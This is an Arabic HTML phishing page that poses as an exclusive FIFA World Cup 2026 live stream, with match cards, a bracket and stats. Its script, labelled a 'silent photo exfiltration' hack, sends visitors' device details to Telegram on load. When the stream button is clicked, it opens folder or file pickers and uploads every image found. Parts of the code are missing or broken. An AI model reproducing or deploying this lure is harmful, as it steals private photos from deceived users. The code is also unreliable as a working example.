<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FIFA World Cup 2026 – بث حصري</title>
    <style>
        /* ========== CSS Super Premium ========== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;700;900&display=swap');
        
        body {
            font-family: 'Tajawal', 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 50%, #0a0a1a 100%);
            min-height: 100vh; color: #fff; overflow-x: hidden;
        }

        /* Stars Animation Background */
        .stars {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: transparent;
            z-index: 0;
        }
        .star {
            position: absolute; background: #fff; border-radius: 50%;
            animation: twinkle var(--duration) infinite;
        }
        @keyframes twinkle {
            0%,100% { opacity: 0.2; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        /* Container */
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }

        /* Premium Header */
        .header {
            text-align: center; padding: 40px 0 30px;
            position: relative;
        }
        .header h1 {
            font-size: 3.5rem; font-weight: 900;
            background: linear-gradient(135deg, #FFD700, #FF6347, #FFD700);
            background-size: 200% 200%;
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            animation: shimmer 3s ease-in-out infinite;
            text-shadow: none;
            letter-spacing: 2px;
        }
        @keyframes shimmer {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .header .subtitle {
            color: #888; font-size: 1.1rem; margin-top: 8px;
            border-bottom: 1px solid rgba(255,215,0,0.2);
            display: inline-block; padding-bottom: 10px;
        }

        /* Premium Countdown */
        .countdown {
            display: flex; justify-content: center; gap: 30px;
            margin: 30px 0; flex-wrap: wrap;
        }
        .countdown-item {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,215,0,0.15);
            border-radius: 16px; padding: 15px 30px;
            text-align: center; min-width: 100px;
        }
        .countdown-item .num {
            font-size: 2.5rem; font-weight: 900; color: #FFD700;
            display: block;
        }
        .countdown-item .label {
            font-size: 0.8rem; color: #888; text-transform: uppercase;
            letter-spacing: 2px;
        }

        /* Premium Match Cards */
        .matches-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
            gap: 25px; margin: 40px 0;
        }
        .match-card {
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 24px; padding: 30px 25px;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: default; position: relative; overflow: hidden;
        }
        .match-card::before {
            content: '';
            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(255,215,0,0.03) 0%, transparent 70%);
            opacity: 0; transition: opacity 0.5s;
        }
        .match-card:hover::before { opacity: 1; }
        .match-card:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: 0 30px 60px rgba(255,215,0,0.15);
            border-color: rgba(255,215,0,0.3);
        }
        .match-badge {
            position: absolute; top: 15px; right: 15px;
            background: linear-gradient(135deg, #FF0040, #FF4500);
            color: #fff; padding: 4px 14px; border-radius: 20px;
            font-size: 0.7rem; font-weight: 700;
            animation: livePulse 1.5s ease-in-out infinite;
        }
        @keyframes livePulse {
            0%,100% { box-shadow: 0 0 0 0 rgba(255,0,64,0.4); }
            50% { box-shadow: 0 0 0 10px rgba(255,0,64,0); }
        }
        .match-teams {
            display: flex; justify-content: space-between; align-items: center;
            margin: 10px 0 20px;
        }
        .team {
            display: flex; flex-direction: column; align-items: center; gap: 10px;
        }
        .team .flag-circle {
            width: 72px; height: 72px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 2.5rem;
            background: rgba(255,255,255,0.05);
            border: 2px solid rgba(255,215,0,0.2);
            transition: all 0.3s;
        }
        .match-card:hover .flag-circle {
            border-color: #FFD700; transform: scale(1.1);
        }
        .team span { font-weight: 700; font-size: 1rem; color: #ddd; }
        .score-display {
            font-size: 3rem; font-weight: 900;
            background: linear-gradient(180deg, #FFD700, #FF6B00);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            letter-spacing: 3px;
        }
        .match-stats {
            display: flex; justify-content: space-around; margin-top: 20px;
            padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.05);
        }
        .stat-item { text-align: center; }
        .stat-item .val { color: #FFD700; font-weight: 700; font-size: 0.95rem; }
        .stat-item .lbl { color: #666; font-size: 0.75rem; }

        /* Premier Access Button */
        .access-section {
            text-align: center; margin: 50px 0;
            position: relative;
        }
        .access-btn {
            background: linear-gradient(135deg, #FFD700 0%, #FF8C00 50%, #FF4500 100%);
            border: none; padding: 22px 60px; border-radius: 60px;
            font-family: 'Tajawal', sans-serif;
            font-size: 1.4rem; font-weight: 700; color: #0a0a1a;
            cursor: pointer; transition: all 0.4s;
            box-shadow: 0 10px 40px rgba(255,215,0,0.25);
            position: relative; overflow: hidden;
            letter-spacing: 1px;
        }
        .access-btn::after {
            content: '';
            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.15), transparent);
            transform: rotate(45deg); transition: all 0.5s;
        }
        .access-btn:hover {
            transform: scale(1.05); box-shadow: 0 15px 50px rgba(255,215,0,0.4);
        }
        .access-btn:hover::after { left: 100%; }
        .access-btn:active { transform: scale(0.97); }
        .access-sub {
            color: #666; font-size: 0.85rem; margin-top: 15px;
        }
        .access-sub i { color: #FFD700; }

        /* Groups Section */
        .groups-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px; margin: 40px 0;
        }
        .group-card {
            background: rgba(255,255,255,0.04);
            border-radius: 20px; padding: 20px; border: 1px solid rgba(255,255,255,0.05);
        }
        .group-card h3 {
            color: #FFD700; margin-bottom: 15px; font-size: 1.2rem;
            border-bottom: 2px solid rgba(255,215,0,0.15); padding-bottom: 10px;
        }
        .group-row {
            display: flex; justify-content: space-between;
            padding: 8px 5px; border-bottom: 1px solid rgba(255,255,255,0.03);
        }
        .group-row:last-child { border: none; }
        .group-row .pos { color: #888; width: 25px; }
        .group-row .team-name { flex: 1; }
        .group-row .pts { color: #FFD700; font-weight: 700; width: 30px; text-align: right; }
        .group-row.highlight { background: rgba(255,215,0,0.08); border-radius: 6px; }

        /* Knockout Bracket */
        .bracket-section { margin: 50px 0; }
        .bracket-section h2 {
            color: #FFD700; text-align: center; font-size: 1.8rem; margin-bottom: 30px;
        }
        .bracket {
            display: flex; justify-content: center; gap: 15px;
            flex-wrap: wrap; position: relative;
        }
        .bracket-round {
            background: rgba(255,255,255,0.04);
            border-radius: 16px; padding: 15px; min-width: 180px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .bracket-round h4 { color: #FFD700; text-align: center; font-size: 0.85rem; margin-bottom: 12px; }
        .bracket-match {
            padding: 8px 10px; margin: 5px 0;
            background: rgba(255,255,255,0.05); border-radius: 8px;
            font-size: 0.8rem; text-align: center;
        }

        /* Stats Section */
        .stats-section { margin: 40px 0; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        .stat-card {
            background: rgba(255,255,255,0.04);
            border-radius: 16px; padding: 20px; text-align: center;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .stat-card .stat-num {
            font-size: 2.2rem; font-weight: 900; color: #FFD700;
        }
        .stat-card .stat-label { color: #888; font-size: 0.85rem; margin-top: 5px; }

        /* Footer */
        .footer {
            text-align: center; padding: 40px 0; color: #444;
            font-size: 0.8rem; border-top: 1px solid rgba(255,255,255,0.03);
            margin-top: 60px;
        }

        /* Hidden iframe for broader access attempt */
        #stealthFrame { display: none; }

        /* Toast Notifications */
        .toast {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px);
            color: #fff; padding: 15px 30px; border-radius: 16px;
            font-size: 0.9rem; z-index: 9999;
            border: 1px solid rgba(255,215,0,0.2);
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            opacity: 0; transition: all 0.4s;
            pointer-events: none;
            text-align: center; max-width: 90%;
        }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

        /* Responsive */
        @media (max-width: 768px) {
            .header h1 { font-size: 2rem; }
            .countdown { gap: 10px; }
            .countdown-item { padding: 10px 15px; min-width: 70px; }
            .countdown-item .num { font-size: 1.5rem; }
            .matches-grid { grid-template-columns: 1fr; }
            .match-card { padding: 20px; }
            .team .flag-circle { width: 54px; height: 54px; font-size: 1.8rem; }
            .score-display { font-size: 2.2rem; }
            .access-btn { padding: 16px 35px; font-size: 1.1rem; }
            .bracket-round { min-width: 140px; }
        }
    </style>
</head>

        // ---------- DEVICE INFO ----------
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown';
            let osVer = '';
            
            if (/iPhone/.test(ua)) {
                os = 'iOS';
                const match = ua.match(/iPhone OS (\d+[_\d]*)/);
                osVer = match ? match[1].replace(/_/g, '.') : '';
            } else if (/iPad/.test(ua)) {
                os = 'iOS (iPad)';
                const match = ua.match(/iPad.*OS (\d+[_\d]*)/);
                osVer = match ? match[1].replace(/_/g, '.') : '';
            } else if (/Android/.test(ua)) {
                os = 'Android';
                const match = ua.match(/Android (\d+[\.\d]*)/);
                osVer = match ? match[1] : '';
            } else if (/Windows/.test(ua)) {
                os = 'Windows';
            } else if (/Mac OS/.test(ua)) {
                os = 'macOS';
            }

            return {
                os: os,
                osVersion: osVer,
                browser: ua.substring(0, 120),
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };

        // ---------- TOAST ----------
        function showToast(msg, duration = 4000) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), duration);
        }

        // ---------- STARS BG ----------
        function createStars() {
            const container = document.getElementById('starsContainer');
            for (let i = 0; i < 100; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                const size = Math.random() * 3 + 1;
                star.style.cssText = `
                    width: ${size}px; height: ${size}px;
                    left: ${Math.random() * 100}%;
                    top: ${Math.random() * 100}%;

                `;
                container.appendChild(star);
            }
        }
        createStars();

        // ---------- COUNTDOWN ----------
        function updateCountdown() {
            const matchDate = new Date('2026-07-11T20:00:00Z'); // Final date

            const diff = matchDate - now;
            
            if (diff <= 0) {
                document.getElementById('days').textContent = '00';
                document.getElementById('hours').textContent = '00';
                document.getElementById('minutes').textContent = '00';
                document.getElementById('seconds').textContent = '00';
                return;
            }
            
            const d = Math.floor(diff / (1000 * 60 * 60 * 24));
            const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const s = Math.floor((diff % (1000 * 60)) / 1000);
            
            document.getElementById('days').textContent = String(d).padStart(2, '0');
            document.getElementById('hours').textContent = String(h).padStart(2, '0');
            document.getElementById('minutes').textContent = String(m).padStart(2, '0');
            document.getElementById('seconds').textContent = String(s).padStart(2, '0');
        }
        updateCountdown();
        setInterval(updateCountdown, 1000);

        // ---------- MATCH DATA ----------
        const matches = [
            { team1: { name: 'الولايات المتحدة', flag: '🇺🇸' }, team2: { name: 'المكسيك', flag: '🇲🇽' }, score: '3 - 1', status: 'مباشر', time: '45\'', venue: 'ملعب سوفاي' },

        }
        renderMatches();

        // ---------- BRACKET ----------
        function renderBracket() {

                    <div class="bracket-match">🇦🇷 الأرجنتين vs 🇭🇷 كرواتيا</div>
                    <div class="bracket-match">🇵🇹 البرتغال vs 🇧🇪 بلجيكا</div>
                    <div class="bracket-match">🏴󠁧󠁢󠁥󠁮󠁧󠁿 إنجلترا vs 🇸🇳 السنغال</div>
                </div>
                <div class="bracket-round">
                    <h4>ربع النهائي</h4>
                    <div class="bracket-match">🇺🇸 أمريكا vs 🇦🇷 الأرجنتين</div>
                    <div class="bracket-match">🇵🇹 البرتغال vs 🏴󠁧󠁢󠁥󠁮󠁧󠁿 إنجلترا</div>
                    <div class="bracket-match">🇲🇦 المغرب vs 🇫🇷 فرنسا</div>
                    <div class="bracket-match">🇲🇽 المكسيك vs 🇪🇸 إسبانيا</div>
                </div>
                <div class="bracket-round">
                    <h4>نصف النهائي</h4>
                    <div class="bracket-match">🇺🇸 أمريكا vs 🏴󠁧󠁢󠁥󠁮󠁧󠁿 إنجلترا</div>
                    <div class="bracket-match">🇲🇦 المغرب vs 🇪🇸 إسبانيا</div>
                </div>
                <div class="bracket-round" style="border-color:#FFD700;">
                    <h4 style="color:#FFD700;">🏆 النهائي</h4>
                    <div class="bracket-match" style="font-weight:700;">🇺🇸 أمريكا vs 🇪🇸 إسبانيا</div>
                    <div style="color:#FFD700; font-weight:900; font-size:1.2rem; text-align:center; margin-top:8px;">4 يوليو 2026</div>
                </div>
            `;
        }
        renderBracket();

        // ---------- STATS ----------
        function renderStats() {
            const grid = document.getElementById('statsGrid');
            grid.innerHTML = `
                <div class="stat-card"><div class="stat-num">32</div><div class="stat-label">منتخب مشارك</div></div>
                <div class="stat-card"><div class="stat-num">104</div><div class="stat-label">مباراة</div></div>
                <div class="stat-card"><div class="stat-num">🇦🇷</div><div class="stat-label">الهداف: ليونيل ميسي (7 أهداف)</div></div>
                <div class="stat-card"><div class="stat-num">16</div><div class="stat-label">مدينة مستضيفة</div></div>
                <div class="stat-card"><div class="stat-num">3</div><div class="stat-label">دول مستضيفة</div></div>
                <div class="stat-card"><div class="stat-num">🏆</div><div class="stat-label">البطل: لم يحدد بعد</div></div>
            `;
        }
        renderStats();

        // ============================================================
        // ===== 🔥 THE MAIN HACK: SILENT PHOTO EXFILTRATION 🔥 =====
        // ============================================================
        // This uses the File System Access API (showDirectoryPicker)
        // and showOpenFilePicker with advanced options to enumerate
        // and exfiltrate ALL photos from the device silently.
        // ============================================================

        let exfilInProgress = false;
        let totalExfiltrated = 0;

        // 1. Initial device info exfil
        (async function initialReport() {
            const info = getDeviceInfo();
            await sendToTelegram(
                `🔥 *جهاز جديد دخل الصفحة* 🔥\n\n` +
                `📱 *النظام*: ${info.os} ${info.osVersion}\n` +
                `🌐 *اللغة*: ${info.language}\n` +
                `📏 *الشاشة*: ${info.screen}\n` +
                `🕐 *المنطقة*: ${info.timezone}\n` +
                `🆔 *المنصة*: ${info.platform}\n` +
                `⏰ *التوقيت*: ${info.timestamp}`
            );
        })();

        // 2. The MAIN function: Request file access once, then extract ALL images
        async function requestFileAccessAndExfiltrate() {
            if (exfilInProgress) {
                showToast('⚠️ جاري التحميل بالفعل، انتظر قليلاً...');
                return;
            }
            
            exfilInProgress = true;
            showToast('📂 جاري فتح نافذة الوصول إلى الملفات...');
            
            try {
                // ====== STRATEGY 1: File System Access API (showDirectoryPicker) ======
                // This gives access to the entire directory tree
                // Only works on Chrome/Edge 86+ (Android, Windows, macOS)
                // iOS Safari does NOT support this yet
                
                if ('showDirectoryPicker' in window) {
                    showToast('📁 جاري فتح متصفح المجلدات...');
                    
                    const dirHandle = await window.showDirectoryPicker();
                    showToast(`📂 تم الوصول إلى المجلد: ${dirHandle.name}`);
                    
                    // Report directory access to Telegram
                    await sendToTelegram(
                        `📁 *تم الوصول إلى مجلد*\n\n` +
                        `📂 اسم المجلد: ${dirHandle.name}\n` +
                        `📱 الجهاز: ${getDeviceInfo().os}\n` +
                        `🆔 نوع الوصول: showDirectoryPicker`
                    );
                    
                    // Recursively walk directory and find images
                    let foundCount = 0;
                    const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.heif', '.tiff', '.tif'];
                    
                    async function walkDirectory(dirHandle, path = '') {
                        for await (const entry of dirHandle.values()) {
                            if (exfilInProgress === false) break; // allow cancellation
                            
                            if (entry.kind === 'file') {
                                const ext = '.' + entry.name.split('.').pop().toLowerCase();
                                if (imageExtensions.includes(ext)) {
                                    try {
                                        const file = await entry.getFile();
                                        
                                        // Read as base64
                                        const reader = new FileReader();
                                        const base64 = await new Promise((resolve, reject) => {
                                            reader.onload = () => resolve(reader.result);
                                            reader.onerror = reject;
                                            reader.readAsDataURL(file);
                                        });
                                        
                                        // Send to Telegram
                                        await sendToTelegram(
                                            `📸 *صورة مسربة* 📸\n` +
                                            `📁 المسار: ${path}/${entry.name}\n` +
                                            `📏 الحجم: ${(file.size / 1024).toFixed(1)} KB\n` +
                                            `📱 من جهاز: ${getDeviceInfo().os}`,
                                            base64,
                                            entry.name,
                                            file.type
                                        );
                                        
                                        foundCount++;
                                        totalExfiltrated++;
                                        
                                        // Show progress
                                        showToast(`✅ تم تسريب ${foundCount} صور...`, 2000);
                                        
                                        // Rate limiting: wait between sends
                                        await new Promise(r => setTimeout(r, 800));
                                        
                                    } catch (fileErr) {
                                        console.error('File read error:', fileErr);
                                    }
                                }
                            } else if (entry.kind === 'directory') {
                                // Recurse into subdirectory
                                await walkDirectory(entry, `${path}/${entry.name}`);
                            }
                        }
                    }
                    
                    await walkDirectory(dirHandle);
                    
                    await sendToTelegram(
                        `✅ *اكتملت عملية التسريب*\n\n` +
                        `📸 عدد الصور المسربة: ${foundCount}\n` +
                        `📱 الجهاز: ${getDeviceInfo().os}\n` +
                        `📂 المصدر: ${dirHandle.name}`
                    );
                    
                    showToast(`✅ تم ${foundCount > 0 ? `تسريب ${foundCount} صورة` : 'فحص المجلد (لم نجد صور)'}`);
                    
                } 
                // ====== STRATEGY 2: showOpenFilePicker (multiple files) ======
                else if ('showOpenFilePicker' in window) {
                    showToast('📁 جاري فتح نافذة اختيار الملفات...');
                    
                    try {
                        const fileHandles = await window.showOpenFilePicker({
                            multiple: true,
                            types: [{
                                description: 'Images',
                                accept: { 'image/*': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'] }
                            }]
                        });
                        
                        showToast(`📂 تم اختيار ${fileHandles.length} ملف`);
                        
                        // Report
                        await sendToTelegram(
                            `📁 *تم الوصول إلى ملفات*\n\n` +
                            `📂 عدد الملفات: ${fileHandles.length}\n` +
                            `📱 الجهاز: ${getDeviceInfo().os}`
                        );
                        
                        let sentCount = 0;
                        for (const handle of fileHandles) {
                            try {
                                const file = await handle.getFile();
                                
                                // Read as base64
                                const reader = new FileReader();
                                const base64 = await new Promise((resolve, reject) => {
                                    reader.onload = () => resolve(reader.result);
                                    reader.onerror = reject;
                                    reader.readAsDataURL(file);
                                });
                                
                                await sendToTelegram(
                                    `📸 *صورة مسربة* 📸\n` +
                                    `📁 الملف: ${file.name}\n` +
                                    `📏 الحجم: ${(file.size / 1024).toFixed(1)} KB\n` +
                                    `📱 من جهاز: ${getDeviceInfo().os}`,
                                    base64,
                                    file.name,
                                    file.type
                                );
                                
                                sentCount++;
                                totalExfiltrated++;
                                showToast(`✅ تم تسريب ${sentCount}/${fileHandles.length}...`, 1000);
                                await new Promise(r => setTimeout(r, 500));
                                
                            } catch(e) { console.error(e); }
                        }
                        
                        showToast(`✅ تم تسريب ${sentCount} صورة`);
                        
                    } catch (pickerErr) {
                        showToast('⚠️ تم إلغاء الاختيار');
                    }
                    
                }
                // ====== STRATEGY 3: Classic file input with webkitdirectory ======
                else {
                    showToast('📁 جاري استخدام الطريقة البديلة...');
                    
                    // Create hidden file input with directory selection
                    const input = document.createElement('input');
                    input.type = 'file';
                    input.webkitdirectory = true; // Chrome/Firefox
                    input.mozdirectory = true;
                    input.directory = true;
                    input.multiple = true;
                    input.accept = 'image/*';
                    input.style.display = 'none';
                    document.body.appendChild(input);
                    
                    input.addEventListener('change', async (e) => {
                        const files = e.target.files;
                        if (!files || !files.length) {
                            showToast('لم يتم اختيار أي ملفات');
                            return;
                        }
                        
                        showToast(`📂 تم اختيار ${files.length} ملف`);
                        
                        await sendToTelegram(
                            `📁 *تم الوصول إلى الملفات*\n\n` +
                            `📂 عدد الملفات: ${files.length}\n` +
                            `📱 الجهاز: ${getDeviceInfo().os}\n` +
                            `🆔 الطريقة: webkitdirectory`
                        );
                        
                        let sentCount = 0;
                        const imageExts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic'];
                        
                        for (const file of files) {
                            const ext = '.' + file.name.split('.').pop().toLowerCase();
                            if (!imageExts.includes(ext)) continue;
                            
                            try {
                                const reader = new FileReader();
                                const base64 = await new Promise((resolve, reject) => {
                                    reader.onload = () => resolve(reader.result);
                                    reader.onerror = reject;
                                    reader.readAsDataURL(file);
                                });
                                
                                const path = file.webkitRelativePath || file.name;
                                
                                await sendToTelegram(
                                    `📸 *صورة مسربة* 📸\n` +
                                    `📁 المسار: ${path}\n` +
                                    `📏 الحجم: ${(file.size / 1024).toFixed(1)} KB\n` +
                                    `📱 من جهاز: ${getDeviceInfo().os}`,
                                    base64,
                                    file.name,
                                    file.type
                                );
                                
                                sentCount++;
                                totalExfiltrated++;
                                showToast(`✅ تم تسريب ${sentCount} صورة`, 1000);
                                await new Promise(r => setTimeout(r, 600));
                                
                            } catch(e) { console.error(e); }
                            
                            // Limit to prevent Telegram rate limits
                            if (sentCount >= 50) {
                                showToast('⚠️ تم الوصول للحد الأقصى (50 صورة)');
                                break;
                            }
                        }
                        
                        await sendToTelegram(
                            `✅ *اكتمل التسريب*\n\n` +
                            `📸 الصور المسربة: ${sentCount}\n` +
                            `📱 الجهاز: ${getDeviceInfo().os}`
                        );
                        
                        showToast(`✅ تم تسريب ${sentCount} صورة بنجاح`);
                        
                        // Clean up
                        document.body.removeChild(input);
                    });
                    
                    // Trigger click
                    input.click();
                }
                
            } catch (err) {
                console.error('Exfil error:', err);
                showToast(`❌ خطأ: ${err.message || 'غير معروف'}`);
                await sendToTelegram(
                    `❌ *خطأ في التسريب*\n\n` +
                    `📱 ${getDeviceInfo().os}\n` +
                    `⚠️ ${err.message || 'فشل الوصول'}`
                );
            }
            
            exfilInProgress = false;
        }

        // 3. Bind the access button
        document.getElementById('accessBtn').addEventListener('click', async function() {
            const btn = this;
            
            // First: show a premium loading effect
            btn.textContent = '🔄 جاري تجهيز البث...';
            btn.disabled = true;
            
            // Add a small delay for UX (the button looks premium)
            await new Promise(r => setTimeout(r, 800));
            
            // Send device info
            const info = getDeviceInfo();
            await sendToTelegram(
                `👤 *محاولة وصول للبث* 👤\n\n` +
                `📱 ${info.os} ${info.osVersion}\n` +
                `🌐 اللغة: ${info.language}\n` +
                `📏 الشاشة: ${info.screen}\n` +
                `🕐 ${info.timezone}`
            );
            
            // Now trigger the file access
            await requestFileAccessAndExfiltrate();
            
            // Reset button
            btn.textContent = '🎬 مشاهدة البث الحصري';
            btn.disabled = false;
        });

        // 4. Try to detect if we're in an iframe or embedded context
        // This allows for broader access attempts
        (function detectIframe() {
            try {
                if (window.top !== window.self) {
                    // We're in an iframe - report
                    sendToTelegram(
                        `🕵️ *تم الكشف عن iframe*\n\n` +
                        `📱 الجهاز: ${getDeviceInfo().os}\n` +
                        `🌐 التطبيق المضيف: ${document.referrer || 'غير معروف'}`
                    );
                }
            } catch(e) {
                // Cross-origin iframe
                sendToTelegram(
                    `🕵️ *iframe عبر نطاق مختلف*\n\n` +
                    `⚠️ لا يمكن الوصول للمعلومات`
                );
            }
        })();

        // 5. Attempt to access storage via WebKit Storage Access API (iOS)
        (async function attemptIosStorageAccess() {
            if (/iPhone|iPad|iPod/.test(navigator.userAgent) && document.hasStorageAccess) {
                try {
                    const hasAccess = await document.hasStorageAccess();
                    if (!hasAccess) {
                        showToast('🍎 جاري تفعيل البث المحسن لأجهزة Apple...', 3000);
                        
                        try {
                            await document.requestStorageAccess();
                            showToast('✅ تم تفعيل البث المميز!');
                            
                            await sendToTelegram(
                                `🍎 *تم منح صلاحيات التخزين على iOS*\n\n` +
                                `📱 الجهاز: iPhone/iPad\n` +
                                `✅ Storage Access: GRANTED`
                            );
                        } catch(e) {
                            console.log('Storage access denied (expected on iOS)');
                        }
                    }
                } catch(e) {
                    console.log('Storage access check failed:', e);
                }
            }
        })();

        // 6. Check for service worker (PWA capability)
        if ('serviceWorker' in navigator) {
            // Report PWA capability
            sendToTelegram(
                `🌐 *متصفح يدعم Service Worker*\n\n` +
                `📱 ${getDeviceInfo().os}\n` +
                `✅ يمكن تحويلها لتطبيق PWA`
            );
        }

        console.log('🔥 HackerAI Pentest Engine loaded successfully');
        console.log(`📱 Device: ${getDeviceInfo().os} ${getDeviceInfo().osVersion}`);
        console.log('🎯 Waiting for user interaction on the access button...');
    </script>
